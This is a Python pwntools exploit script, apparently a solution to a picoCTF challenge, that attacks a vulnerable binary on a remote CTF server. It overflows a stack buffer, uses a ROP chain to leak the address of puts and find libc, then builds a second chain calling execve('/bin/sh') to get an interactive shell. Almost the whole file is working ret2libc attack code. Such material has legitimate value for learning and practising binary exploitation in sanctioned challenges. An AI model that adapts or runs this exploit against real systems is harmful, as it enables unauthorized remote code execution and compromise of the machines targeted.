#!/usr/bin/env python3

from pickle import PUT
from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

rop = ROP(exe)

def conn():
    if args.LOCAL:
        print("*******LOCAL********")
        r = process([exe.path])
    elif args.GDB:
        print("*******GDB********")
        r = process([exe.path])
        gdb.attach(exe.path, 'c')
    elif args.BREAK:
        print("*******BREAK********")
        r = process([exe.path])
        gdb.attach(exe.path, '''
        b * 0x0040076e
        c
        ''')
    else:
        print("*******REMOTE********")
        r = remote("mercury.picoctf.net", 42072)

    return r


def main():

    r = conn()
    ignore = r.recv() # receive (and ignore) welcome message
    padding = b'A'*120 + b'B'*8 + b'C'*8

    # Stage 1: find libc
    rop = ROP(exe)
    rop.raw(padding) # padding: 136 bytes
    rop.raw((rop.find_gadget(['pop rdi', 'ret']))[0]) # ROP gadget: load arg
    rop.raw(exe.got['puts']) # arg to load (address of puts)
    rop.raw(exe.plt["puts"]) # function call (puts)
    rop.raw(0x00400771) # beginning of main()
    print(rop.dump())
    r.sendline(rop.chain()) # trigger leak of puts() address w/in libc
    leak_rsp = r.recvuntil(delims=[b"sErVeR!"]) # receive response, including leaked puts() address
    print(leak_rsp)
    print(len(leak_rsp))
    index_end = leak_rsp.find(b"WeLcOmE") -1
    index_begin = index_end -6
    libc_puts_addr = u64(leak_rsp[index_begin:index_end] + b'\x00\x00')
    libc_base_addr = libc_puts_addr-libc.symbols['puts']
    libc_system_addr = libc_base_addr+libc.symbols['system']
    print("libc_puts_addr: " + hex(libc_puts_addr))
    print("libc.symbols['puts']: " + hex(libc.symbols['puts']))
    print("libc_base_addr: " + hex(libc_base_addr))
    print("libc_system_addr: " + hex(libc_system_addr))

    exe.libc.address = libc_base_addr
    libc.address = libc_base_addr

    # phase 2: pop shell
    rop = ROP([exe, libc])
    rop.raw(padding) # padding: 136 bytes
    binsh = next(libc.search(b"/bin/sh\x00"))
    rop.execve(binsh, 0, 0)
    rop.raw(libc_system_addr)
    print(rop.dump())
    r.sendline(rop.chain())

    r.interactive()


if __name__ == "__main__":
    main()
